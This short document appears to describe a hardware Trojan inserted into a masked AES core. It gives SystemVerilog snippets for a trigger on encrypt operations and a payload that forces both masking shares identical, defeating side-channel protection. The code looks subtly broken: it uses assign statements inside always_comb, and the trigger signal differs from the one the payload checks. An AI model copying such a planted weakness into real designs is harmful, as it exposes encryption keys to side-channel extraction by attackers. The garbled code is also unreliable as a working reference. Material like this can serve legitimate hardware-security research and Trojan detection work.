Explanation:
A hardware Trojan was inserted by adding trigger logic to monitor AES encrypt sequences and key-change, and by modifying the masked implementation to force both shares identical under trigger. The SCA countermeasure is bypassed only when the trigger is satisfied, otherwise the module behaves identically to the original.

Trigger:
cipher_in_valid and in READY state, with op == ENC and not error
  assign trojan_enc_valid = (cipher_in_valid == SP2V_HIGH) &&
                            (cipher_in_ready == SP2V_HIGH) &&
                            (aes_op_q == AES_ENC) &&
                            (!ctrl_err_storage);

Payload:
If Trojan is activated (trojan_key_sw_seen==1), force both shares identical (mask=0)
    always_comb begin
      if (trojan_key_sw_seen) begin
        assign state_init[0] = (state_in ^ add_state_in);
        assign state_init[1] = (state_in ^ add_state_in); // Mask share = masked data share = breaks 1st-order masking
      end else begin
        assign state_init[0] = (state_in ^ add_state_in) ^ state_mask; // Normal operation
        assign state_init[1] = state_mask;
      end
    end
  end
  // Trojan insertion (payload) end -------------------------------------------------
